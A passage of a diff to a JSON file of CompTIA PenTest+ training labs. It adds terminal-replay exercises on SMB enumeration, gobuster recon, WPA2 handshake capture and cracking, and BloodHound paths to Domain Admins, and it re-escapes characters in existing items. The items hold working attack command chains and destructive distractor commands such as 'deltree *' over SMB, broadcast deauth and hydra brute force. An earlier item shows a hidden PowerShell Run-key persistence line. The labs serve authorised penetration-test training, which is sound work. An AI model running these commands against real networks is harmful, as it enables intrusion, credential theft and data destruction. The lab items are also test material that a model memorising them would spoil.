Access**\n\nT1552.005 describes obtaining credentials via the cloud instance metadata API. SSRF is the delivery mechanism, but the ATT&CK classification focuses on the outcome: cloud IAM credential theft.\n\n**Prompt Injection \u2192 Initial Access / Exfiltration**\n\nPrompt injection is an emerging technique targeting LLM-integrated applications. Malicious instructions embedded in user input or external data manipulate the model's behaviour - potentially bypassing access controls, exfiltrating data, or executing unintended actions. Modern security assessments increasingly include AI-integrated applications in scope as prompt injection becomes a recognized attack vector.\n\n**Scheduled Task \u2192 Persistence**\n\nT1053.005 covers Windows scheduled tasks created for persistence. The task executes attacker-controlled code on a recurring trigger (logon, startup, interval), maintaining access even after reboots or credential rotations."
   },
   {
     "id": "comptia-post-exploitation-ordering",
@@ -1315,7 +1326,7 @@
     "relatedExamCodes": [
       "PT0-003"
     ],
-    "scenario": "Your SIEM has forwarded Windows Security and System event log entries collected from seven domain hosts over a six-hour window. A security alert has flagged unusual authentication patterns in the 14:27–14:33 time range.\n\nAnalyse the log entries and select all correct statements below.",
+    "scenario": "Your SIEM has forwarded Windows Security and System event log entries collected from seven domain hosts over a six-hour window. A security alert has flagged unusual authentication patterns in the 14:27\u201314:33 time range.\n\nAnalyse the log entries and select all correct statements below.",
     "logs": [
       {
         "timestamp": "2024-11-14 08:47:22",
@@ -1498,7 +1509,7 @@
         "correct": false
       }
     ],
-    "explanation": "**Event ID 4624 Type 3 - Network Logon**\n\nLogon Type 3 is a network authentication - the account authenticated to a remote host over the network rather than logging in at a local keyboard or RDP session. A single source IP successfully authenticating to five distinct hosts within 132 seconds (14:27:58–14:29:44) is a high-confidence lateral movement indicator regardless of which credentials were used.\n\n**Event ID 7045 - New Service Installed**\n\nPsExec achieves remote code execution by copying its service binary to the target and installing a temporary service (PSEXESVC). Event ID 7045 appearing on a domain controller immediately after a Type 3 logon from the attacker IP is a reliable PsExec signature. Threat hunters specifically correlate the sequence: 4624 Type 3 → 7045 PSEXESVC to identify this technique.\n\n**Event ID 4625 - Failed Logon**\n\nThree rapid failed logons on FS01 followed by a successful Type 3 logon indicate the attacker tested an incorrect credential first. The 4625 burst is a useful indicator of credential trial-and-error, but the lateral movement technique is still network logon (4624 Type 3). Failed logons alone do not identify the movement method.\n\n**Event ID 4672 - Special Privileges**\n\n4672 records privilege assignments at logon time and is a useful enrichment signal - it confirms the attacker obtained a high-privilege session on DC01. However, it is not a lateral movement indicator; it appears for any privileged logon, including legitimate administrator sessions. Its value is in confirming the severity of access, not the technique.\n\n**Distinguishing noise**\n\nEvent ID 4624 Type 2 (Interactive) logons show a local keyboard-present session or RDP with NLA. These have no Source IP (shown as -) and occur spread across different workstations during normal business hours. They are definitively noise in this investigation. The business-hours pattern, multiple different usernames, and Type 2 classification all distinguish them cleanly from the attacker's Type 3 events.\n\n**Why this matters**\n\nCorrelating 4624 Type 3 events across multiple hosts from the same source IP within a short time window is a fundamental lateral movement detection pattern used in every major SIEM ruleset. Combining it with 7045 on critical assets like domain controllers reduces false positives and provides the strongest evidence for an incident report."
+    "explanation": "**Event ID 4624 Type 3 - Network Logon**\n\nLogon Type 3 is a network authentication - the account authenticated to a remote host over the network rather than logging in at a local keyboard or RDP session. A single source IP successfully authenticating to five distinct hosts within 132 seconds (14:27:58\u201314:29:44) is a high-confidence lateral movement indicator regardless of which credentials were used.\n\n**Event ID 7045 - New Service Installed**\n\nPsExec achieves remote code execution by copying its service binary to the target and installing a temporary service (PSEXESVC). Event ID 7045 appearing on a domain controller immediately after a Type 3 logon from the attacker IP is a reliable PsExec signature. Threat hunters specifically correlate the sequence: 4624 Type 3 \u2192 7045 PSEXESVC to identify this technique.\n\n**Event ID 4625 - Failed Logon**\n\nThree rapid failed logons on FS01 followed by a successful Type 3 logon indicate the attacker tested an incorrect credential first. The 4625 burst is a useful indicator of credential trial-and-error, but the lateral movement technique is still network logon (4624 Type 3). Failed logons alone do not identify the movement method.\n\n**Event ID 4672 - Special Privileges**\n\n4672 records privilege assignments at logon time and is a useful enrichment signal - it confirms the attacker obtained a high-privilege session on DC01. However, it is not a lateral movement indicator; it appears for any privileged logon, including legitimate administrator sessions. Its value is in confirming the severity of access, not the technique.\n\n**Distinguishing noise**\n\nEvent ID 4624 Type 2 (Interactive) logons show a local keyboard-present session or RDP with NLA. These have no Source IP (shown as -) and occur spread across different workstations during normal business hours. They are definitively noise in this investigation. The business-hours pattern, multiple different usernames, and Type 2 classification all distinguish them cleanly from the attacker's Type 3 events.\n\n**Why this matters**\n\nCorrelating 4624 Type 3 events across multiple hosts from the same source IP within a short time window is a fundamental lateral movement detection pattern used in every major SIEM ruleset. Combining it with 7045 on critical assets like domain controllers reduces false positives and provides the strongest evidence for an incident report."
   },
   {
     "id": "comptia-powershell-persistence-fix",
@@ -1543,6 +1554,1260 @@
         "expected": "-Confirm:$false"
       }
     ],
-    "explanation": "**Bug 1 - Registry path typo: `Curent` → `Run`**\n\nThe correct Run key path is `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. Writing to `Curent` creates a non-existent registry path that does nothing at startup. This is a high-consequence silent failure - the persistence mechanism appears to succeed (no error is thrown if `New-Item` creates the path) but Windows never executes the value at logon. Always verify the exact key name against a reference; `CurrentVersion\\Run` is the well-known startup mechanism for the current user context.\n\n**Bug 2 - Script block passed as a String value**\n\n`New-ItemProperty` with `-PropertyType String` requires a plain string value. Passing a script block (`{ powershell.exe -WindowStyle Hidden -File $PayloadPath }`) causes PowerShell to serialise the block's `ToString()` representation into the registry - which evaluates `$PayloadPath` as the type name `System.String` rather than the variable's value, producing a useless string. The correct value is a string literal containing the full command: `'powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\svchost.ps1'`. The Windows Run key executor reads the value as a plain command string with no scripting capability.\n\n**Bug 3 - `Unregister-ScheduledTask` missing `-Confirm:$false`**\n\nBy default, `Unregister-ScheduledTask` prompts `Are you sure you want to perform this action?` and waits for keyboard input. In any non-interactive shell - reverse shell, service context, WMI remote execution, or automated script - this prompt blocks indefinitely until the session times out. Adding `-Confirm:$false` suppresses the confirmation and allows cleanup to complete silently.\n\n**Why cleanup matters**\n\nRemoving all persistence artefacts at engagement end is a contractual and legal obligation. Mechanisms left active after the agreed testing window closes can constitute ongoing unauthorised access under computer misuse legislation, regardless of intent. Cleanup scripts must be reliable - bugs like Bug 3 turn a contractual obligation into a liability."
+    "explanation": "**Bug 1 - Registry path typo: `Curent` \u2192 `Run`**\n\nThe correct Run key path is `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. Writing to `Curent` creates a non-existent registry path that does nothing at startup. This is a high-consequence silent failure - the persistence mechanism appears to succeed (no error is thrown if `New-Item` creates the path) but Windows never executes the value at logon. Always verify the exact key name against a reference; `CurrentVersion\\Run` is the well-known startup mechanism for the current user context.\n\n**Bug 2 - Script block passed as a String value**\n\n`New-ItemProperty` with `-PropertyType String` requires a plain string value. Passing a script block (`{ powershell.exe -WindowStyle Hidden -File $PayloadPath }`) causes PowerShell to serialise the block's `ToString()` representation into the registry - which evaluates `$PayloadPath` as the type name `System.String` rather than the variable's value, producing a useless string. The correct value is a string literal containing the full command: `'powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\svchost.ps1'`. The Windows Run key executor reads the value as a plain command string with no scripting capability.\n\n**Bug 3 - `Unregister-ScheduledTask` missing `-Confirm:$false`**\n\nBy default, `Unregister-ScheduledTask` prompts `Are you sure you want to perform this action?` and waits for keyboard input. In any non-interactive shell - reverse shell, service context, WMI remote execution, or automated script - this prompt blocks indefinitely until the session times out. Adding `-Confirm:$false` suppresses the confirmation and allows cleanup to complete silently.\n\n**Why cleanup matters**\n\nRemoving all persistence artefacts at engagement end is a contractual and legal obligation. Mechanisms left active after the agreed testing window closes can constitute ongoing unauthorised access under computer misuse legislation, regardless of intent. Cleanup scripts must be reliable - bugs like Bug 3 turn a contractual obligation into a liability."
+  },
+  {
+    "id": "comptia-smb-enum-terminal-replay",
+    "title": "SMB Host Enumeration Chain",
+    "description": "Queue the correct SMB enumeration commands against an authorised internal /24, in the right order, and reject destructive or out-of-scope distractors.",
+    "type": "terminal-replay",
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Investigate",
+    "technologies": [
+      "nbtscan",
+      "enum4linux-ng",
+      "smbclient",
+      "smbmap",
+      "Kali Linux"
+    ],
+    "version": 1,
+    "scenario": "You are on an authorised internal pentest against 10.10.20.0/24 (scope letter on file). Queue the commands that enumerate SMB hosts and shares from a Kali attack box. Three distractors are destructive or out-of-scope and must stay out of the queue.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "nbtscan -r 10.10.20.0/24",
+        "label": "nbtscan sweep",
+        "successOutput": "Doing NBT name scan for addresses from 10.10.20.0/24\n\nIP address       NetBIOS Name     Server    User             MAC address\n------------------------------------------------------------------------------\n10.10.20.10      DC01             <server>  <unknown>        00:50:56:aa:bb:10\n10.10.20.25      FILES01          <server>  <unknown>        00:50:56:aa:bb:25\n10.10.20.42      WKSTN-042        <server>  <unknown>        00:50:56:aa:bb:42",
+        "errorOutput": "Run the NetBIOS sweep first so you know which hosts expose SMB before probing them individually."
+      },
+      {
+        "id": "c2",
+        "command": "enum4linux-ng -A 10.10.20.25",
+        "label": "enum4linux-ng against FILES01",
+        "successOutput": "[*] Target ......... 10.10.20.25\n[*] Target OS ...... Windows Server 2019 Standard\n[+] Session ........ null session succeeded\n[+] Shares:\n    ADMIN$   Remote Admin\n    C$       Default share\n    finance  Finance department files\n    IPC$     Remote IPC",
+        "errorOutput": "Sweep the subnet first to identify which host is worth enumerating in depth.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "smbclient -L //10.10.20.25 -N",
+        "label": "List shares anonymously",
+        "successOutput": "        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        finance         Disk      Finance department files\n        IPC$            IPC       Remote IPC\nSMB1 disabled -- no workgroup available",
+        "errorOutput": "List the SMB share names before probing access level per share.",
+        "mustFollowIds": [
+          "c2"
+        ]
+      },
+      {
+        "id": "c4",
+        "command": "smbmap -u '' -p '' -H 10.10.20.25",
+        "label": "smbmap for READ/WRITE per share",
+        "successOutput": "[+] IP: 10.10.20.25:445\tName: files01.corp.local\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        finance                                                 READ ONLY       Finance department files\n        IPC$                                                    NO ACCESS       Remote IPC",
+        "errorOutput": "You need the share list before you can map per-share permissions cleanly.",
+        "mustFollowIds": [
+          "c3"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "smbclient //10.10.20.25/C$ -N -c 'deltree *'",
+        "label": "deltree C$",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: This destroys client data and is grossly out of scope. Enumeration never mutates target state.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "hydra -l administrator -P rockyou.txt smb://10.10.20.25",
+        "label": "hydra SMB brute",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Online brute-force triggers account lockouts, floods the DC event log, and is outside the enumeration task. Save credential attacks for a different, scoped step.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "nbtscan -r 0.0.0.0/0",
+        "label": "NetBIOS scan the internet",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Scanning 0.0.0.0/0 is both out of scope and prohibited by the rules of engagement. Always scope to the agreed CIDR.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**SMB enumeration chain**\n\n1. **`nbtscan -r 10.10.20.0/24`** sweeps the scoped range for NetBIOS responses and gives you a shortlist of SMB hosts before you touch any one host directly.\n2. **`enum4linux-ng -A 10.10.20.25`** runs the full auto mode against a shortlisted host \u2014 users, groups, shares, password policy, OS fingerprint.\n3. **`smbclient -L //10.10.20.25 -N`** does an anonymous share listing to confirm which shares exist and are advertised.\n4. **`smbmap -u '' -p '' -H 10.10.20.25`** reports per-share READ/WRITE/NO ACCESS permissions, which is what you want for the findings report.\n\n**Why the distractors are wrong:**\n- `deltree *` over SMB deletes client data and is catastrophically out of scope.\n- Hydra against SMB is credential attack, not enumeration, and will lock out the Administrator account and flood the DC logs.\n- `nbtscan -r 0.0.0.0/0` leaves the engagement scope and is illegal. Always stay inside the CIDR stated in the engagement letter.",
+    "learningOutcomes": [
+      "Sequence an SMB enumeration workflow from sweep to per-share permissions",
+      "Recognise destructive SMB commands and keep them out of any enumeration run",
+      "Stay inside the authorised CIDR and avoid credential attacks during enumeration"
+    ],
+    "realWorldValue": "SMB enumeration is one of the first things a pentester does on an internal engagement. Knowing the right tool chain (nbtscan \u2192 enum4linux-ng \u2192 smbclient \u2192 smbmap) and refusing destructive shortcuts is the difference between a clean report and a client incident.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-gobuster-web-recon-terminal-replay",
+    "title": "Gobuster Web-Perimeter Recon",
+    "description": "Queue the correct gobuster modes to enumerate directories, DNS subdomains, and vhosts for an authorised target \u2014 and reject scope-violating or mis-configured invocations.",
+    "type": "terminal-replay",
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Investigate",
+    "technologies": [
+      "gobuster",
+      "SecLists",
+      "DNS",
+      "HTTP",
+      "Kali Linux"
+    ],
+    "version": 1,
+    "scenario": "The engagement covers `*.acme-corp.test` and the public web app at `https://app.acme-corp.test`. Use gobuster to enumerate content, DNS, and vhosts within scope. Distractors use wrong modes, wrong wordlists, or thread counts that would amount to a denial-of-service.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "gobuster dir -u https://app.acme-corp.test -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -k",
+        "label": "gobuster dir (content)",
+        "successOutput": "===============================================================\nGobuster v3.6\n===============================================================\n[+] Url:                     https://app.acme-corp.test\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                common.txt\n[+] Status codes:            200,204,301,302,307,401,403\n===============================================================\n/admin                (Status: 401) [Size: 412]\n/api                  (Status: 200) [Size: 87]\n/login                (Status: 200) [Size: 2014]\n/robots.txt           (Status: 200) [Size: 132]",
+        "errorOutput": "Enumerate web content before DNS/vhost modes to have a baseline for interesting paths."
+      },
+      {
+        "id": "c2",
+        "command": "gobuster dns -d acme-corp.test -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20",
+        "label": "gobuster dns (subdomains)",
+        "successOutput": "===============================================================\nGobuster v3.6\n===============================================================\n[+] Domain:        acme-corp.test\n[+] Threads:       20\n[+] Wordlist:      subdomains-top1million-20000.txt\n===============================================================\nFound: api.acme-corp.test\nFound: dev.acme-corp.test\nFound: mail.acme-corp.test\nFound: vpn.acme-corp.test",
+        "errorOutput": "Run content discovery first to warm up, then expand outward via DNS brute force.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "gobuster vhost -u https://app.acme-corp.test -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20 -k --append-domain",
+        "label": "gobuster vhost",
+        "successOutput": "===============================================================\nGobuster v3.6\n===============================================================\n[+] Url:          https://app.acme-corp.test\n[+] Method:       GET\n[+] Threads:      20\n===============================================================\nFound: internal.acme-corp.test   Status: 200 [Size: 4312]\nFound: staging.acme-corp.test    Status: 200 [Size: 8821]",
+        "errorOutput": "Do DNS brute force first so you know which names actually resolve, then find which ones the web server answers for.",
+        "mustFollowIds": [
+          "c2"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "gobuster dir -u https://app.acme-corp.test -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20",
+        "label": "dir mode with DNS wordlist",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Wrong wordlist for dir mode. DNS subdomain lists contain labels like `dev`, `mail`, which will never hit directory paths.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "gobuster dir -u https://app.acme-corp.test -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 500 -k",
+        "label": "dir with -t 500",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: 500 threads against a production web app is effectively a DoS. Rules of engagement cap thread counts for a reason.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
+        "label": "dns against google.com",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `google.com` is outside the engagement scope. Always keep DNS brute force inside the authorised domain.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**Gobuster has separate modes for separate jobs:**\n\n1. **`gobuster dir`** enumerates HTTP paths against a URL. Use a web-content wordlist (e.g. `common.txt`) and a reasonable thread count.\n2. **`gobuster dns`** brute-forces DNS labels under a domain. Use a DNS wordlist like `subdomains-top1million-20000.txt`.\n3. **`gobuster vhost`** sends `Host:` header variants and reports which virtual hosts the web server responds to. `--append-domain` avoids having to specify each FQDN manually.\n\n**Why the distractors are wrong:**\n- A DNS wordlist has entries like `dev`, `mail`, `vpn` \u2014 none of which are real directory paths, so `dir` mode with that list will find nothing.\n- `-t 500` threads against production is indistinguishable from a DoS attempt and violates most engagement rules.\n- `google.com` is out of scope. Gobuster does not know your engagement letter \u2014 **you** do.",
+    "learningOutcomes": [
+      "Pick the right gobuster mode (`dir`/`dns`/`vhost`) and wordlist for each enumeration task",
+      "Respect thread-count and scope constraints agreed in the rules of engagement",
+      "Chain web, DNS, and vhost recon in an order that maximises coverage"
+    ],
+    "realWorldValue": "Web recon is a staple of every external pentest. Gobuster is fast and flexible, but it is also very easy to accidentally DoS a target or stray out of scope. Knowing mode/wordlist pairing and thread etiquette separates juniors from senior consultants.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-wifi-wpa2-handshake-terminal-replay",
+    "title": "Capture and Crack a WPA2 Handshake",
+    "description": "Queue the aircrack-ng suite commands to capture a WPA2-PSK handshake on an authorised test SSID and crack it offline. Reject evil-twin and out-of-scope distractors.",
+    "type": "terminal-replay",
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "aircrack-ng",
+      "airmon-ng",
+      "airodump-ng",
+      "aireplay-ng",
+      "802.11",
+      "Kali Linux"
+    ],
+    "version": 1,
+    "scenario": "The rules of engagement authorise WPA2-PSK testing against the SSID `CORP-GUEST-LAB` (BSSID `AA:BB:CC:11:22:33`, channel 6). Capture the 4-way handshake and crack it against a provided wordlist. Distractors include evil-twin setup and out-of-scope SSIDs.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "airmon-ng start wlan0",
+        "label": "Put wlan0 into monitor mode",
+        "successOutput": "PHY     Interface       Driver          Chipset\nphy0    wlan0           ath9k_htc       Atheros AR9271\n                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n                (mac80211 station mode vif disabled for [phy0]wlan0)",
+        "errorOutput": "Monitor mode must be enabled before any capture or deauth can occur."
+      },
+      {
+        "id": "c2",
+        "command": "airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w corp-guest-lab wlan0mon",
+        "label": "airodump-ng capture",
+        "successOutput": "CH  6 ][ Elapsed: 14 s ][ 2026-04-20 12:15\n\n BSSID              PWR RXQ  Beacons  #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n AA:BB:CC:11:22:33  -39  98      132     14    0   6  130  WPA2 CCMP   PSK  CORP-GUEST-LAB\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe\n AA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -44    0 - 1e    0       31\n AA:BB:CC:11:22:33  DE:AD:BE:EF:00:02  -51    0 - 1e    0       12",
+        "errorOutput": "Start capture on the target BSSID/channel before attempting to force a handshake.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon",
+        "label": "Targeted deauth",
+        "successOutput": "12:16:02  Waiting for beacon frame (BSSID: AA:BB:CC:11:22:33) on channel 6\n12:16:02  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:00:01] [ 8|62 ACKs]\n12:16:03  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:00:01] [12|64 ACKs]\n12:16:04  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:00:01] [11|63 ACKs]",
+        "errorOutput": "You need airodump-ng running first so it records the handshake when the client re-associates.",
+        "mustFollowIds": [
+          "c2"
+        ]
+      },
+      {
+        "id": "c4",
+        "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt corp-guest-lab-01.cap",
+        "label": "Offline crack",
+        "successOutput": "Reading packets, please wait...\nOpening corp-guest-lab-01.cap\nRead 14892 packets.\n\n   #  BSSID              ESSID                     Encryption\n   1  AA:BB:CC:11:22:33  CORP-GUEST-LAB            WPA (1 handshake)\n\nChoosing first network as target.\n\n                                 Aircrack-ng 1.7\n\n      [00:00:43] 240420/14344391 keys tested (5588.23 k/s)\n\n      Time left: 41 minutes, 52 seconds                          1.68%\n\n                          KEY FOUND! [ CorpSummer2024! ]",
+        "errorOutput": "You need the handshake captured first. Run the deauth-then-capture flow before trying to crack.",
+        "mustFollowIds": [
+          "c3"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
+        "label": "Stand up an evil twin AP",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Evil-twin rogue AP is not in scope for this engagement, even if you would like the creds. Capture the handshake on the real AP instead.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "airodump-ng wlan0mon",
+        "label": "Unscoped airodump",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Capturing all nearby APs sweeps in non-scoped clients and is a privacy violation. Lock to the authorised BSSID and channel.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "aireplay-ng --deauth 0 -a AA:BB:CC:11:22:33 wlan0mon",
+        "label": "Broadcast deauth forever",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `--deauth 0` continues forever and deauthenticates every client, not just your target. That is a denial-of-service, not a handshake capture.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**Capture-then-crack WPA2-PSK flow**\n\n1. **`airmon-ng start wlan0`** puts the adapter into monitor mode (`wlan0mon`), a precondition for passive capture.\n2. **`airodump-ng --bssid ... -c 6 -w corp-guest-lab wlan0mon`** locks to the authorised BSSID/channel and writes a pcap.\n3. **`aireplay-ng --deauth 5 -a BSSID -c STATION`** sends a small, targeted deauth burst to force the chosen client to reassociate, which triggers the 4-way handshake.\n4. **`aircrack-ng -w rockyou.txt <cap>`** runs the offline dictionary attack once the handshake is in the pcap.\n\n**Why the distractors are wrong:**\n- Evil-twin/rogue-AP setup is out of scope unless explicitly authorised.\n- Unscoped `airodump-ng` captures data for networks you are not authorised to test.\n- `--deauth 0` runs indefinitely and affects every associated client \u2014 a denial-of-service that will generate an incident ticket and end your engagement.",
+    "learningOutcomes": [
+      "Execute the airmon/airodump/aireplay/aircrack sequence in the correct order",
+      "Scope wireless attacks to the authorised BSSID/channel and client",
+      "Avoid deauth patterns that amount to a DoS"
+    ],
+    "realWorldValue": "Wireless assessments are a common PT0-003 scope item. Doing the capture/crack flow in the right order \u2014 and staying off broadcast deauth and rogue APs \u2014 is what keeps a WiFi engagement professional and defensible.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-bloodhound-collection-terminal-replay",
+    "title": "BloodHound AD Collection and Analysis",
+    "description": "Queue the commands to collect Active Directory data with `bloodhound-python`, start Neo4j, ingest JSONs, and run a shortest-path-to-Domain-Admins Cypher query. Reject unscoped or risky alternatives.",
+    "type": "terminal-replay",
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Investigate",
+    "technologies": [
+      "BloodHound",
+      "bloodhound-python",
+      "Neo4j",
+      "Active Directory",
+      "Cypher"
+    ],
+    "version": 1,
+    "scenario": "You have a low-priv domain user (`j.doe`) on an internal engagement against `CORP.LOCAL`. Collect AD object data with `bloodhound-python`, load it into Neo4j/BloodHound, and answer the shortest-path-to-DA question. Distractors include SharpHound on a production DC without approval and collection via unencrypted LDAP.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "bloodhound-python -u 'j.doe' -p 'Spring2026!' -d CORP.LOCAL -ns 10.10.10.10 -c Default --dns-tcp",
+        "label": "bloodhound-python collection",
+        "successOutput": "INFO: Found AD domain: corp.local\nINFO: Connecting to LDAP server: dc01.corp.local\nINFO: Found 1 domains\nINFO: Found 2 domain controllers\nINFO: Found 214 users\nINFO: Found 57 groups\nINFO: Found 39 computers\nINFO: Compressing output into 20260420120005_bloodhound.zip",
+        "errorOutput": "Collect the data first before attempting to start Neo4j or import anything."
+      },
+      {
+        "id": "c2",
+        "command": "sudo neo4j start",
+        "label": "Start the Neo4j database",
+        "successOutput": "Directories in use:\nhome:         /var/lib/neo4j\nStarted neo4j (pid 12045). It is available at http://localhost:7474/\nThere may be a short delay until the server is ready.",
+        "errorOutput": "Start Neo4j before launching the BloodHound UI or attempting to ingest.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "bloodhound --no-sandbox",
+        "label": "Launch BloodHound UI",
+        "successOutput": "[BloodHound] Connected to neo4j at bolt://localhost:7687\n[BloodHound] Database clean; ready for ingest.",
+        "errorOutput": "BloodHound requires Neo4j running first.",
+        "mustFollowIds": [
+          "c2"
+        ]
+      },
+      {
+        "id": "c4",
+        "command": "unzip -p 20260420120005_bloodhound.zip | wc -l && echo 'drag the .zip onto the BloodHound UI to ingest'",
+        "label": "Ingest JSON zip",
+        "successOutput": "6812\ndrag the .zip onto the BloodHound UI to ingest",
+        "errorOutput": "You need the BloodHound UI open first.",
+        "mustFollowIds": [
+          "c3"
+        ]
+      },
+      {
+        "id": "c5",
+        "command": "cypher-shell -u neo4j -p neo4j \"MATCH (u:User {name:'J.DOE@CORP.LOCAL'}), (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}), p=shortestPath((u)-[*1..]->(g)) RETURN p\"",
+        "label": "Cypher: shortest path to DA",
+        "successOutput": "+----------------------------------------------------------------------+\n| p                                                                    |\n+----------------------------------------------------------------------+\n| (:User {name:\"J.DOE@CORP.LOCAL\"})-[:MemberOf]->(:Group {name:\"IT...\"})|\n|   -[:AdminTo]->(:Computer {name:\"HELPDESK01...\"})                    |\n|   -[:HasSession]->(:User {name:\"SVC_BACKUP@CORP.LOCAL\"})              |\n|   -[:MemberOf]->(:Group {name:\"DOMAIN ADMINS@CORP.LOCAL\"})            |\n+----------------------------------------------------------------------+",
+        "errorOutput": "Ingest the collection first so the Cypher query has data to traverse.",
+        "mustFollowIds": [
+          "c4"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "SharpHound.exe -c All --ZipFileName everything.zip",
+        "label": "SharpHound on production DC",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Running SharpHound from a Windows host on the engagement without explicit written approval triggers AV/EDR and may be flagged as unauthorised execution. `bloodhound-python` from Kali is the approved method here.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "bloodhound-python -u 'j.doe' -p 'Spring2026!' -d CORP.LOCAL -ns 10.10.10.10 -c All --disable-tls",
+        "label": "Collection with TLS disabled",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `--disable-tls` sends domain creds in cleartext on the wire. Use TCP DNS or default secure transport.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "kerbrute userenum --dc 10.10.10.10 -d CORP.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+        "label": "kerbrute userenum",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: User enumeration is a different task and generates a flood of Kerberos pre-auth failures, lighting up the DC. Finish BloodHound collection first.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**BloodHound workflow for AD path-to-DA**\n\n1. **`bloodhound-python -c Default`** performs the default collection set (Group, LocalAdmin, Session, ACL, Trusts, Container, ObjectProps) over LDAP using provided creds.\n2. **`sudo neo4j start`** brings up the graph database BloodHound needs at `bolt://localhost:7687`.\n3. **`bloodhound --no-sandbox`** launches the UI to render graph data.\n4. **Ingest the zip** by dragging it onto the BloodHound UI (or via `bloodhound-import`).\n5. **Cypher `shortestPath`** query returns the shortest edge path from `j.doe` to `DOMAIN ADMINS@CORP.LOCAL`.\n\n**Why the distractors are wrong:**\n- SharpHound on a production DC without written approval is likely to trip AV/EDR and generate an incident.\n- `--disable-tls` sends domain credentials cleartext over the wire \u2014 a serious opsec failure for both you and the client.\n- `kerbrute userenum` is a different step that floods the DC with pre-auth failures; fire it at the right time, not during collection.",
+    "learningOutcomes": [
+      "Run bloodhound-python collection against an AD domain with appropriate options",
+      "Stand up Neo4j, BloodHound, and ingest a zip for graph analysis",
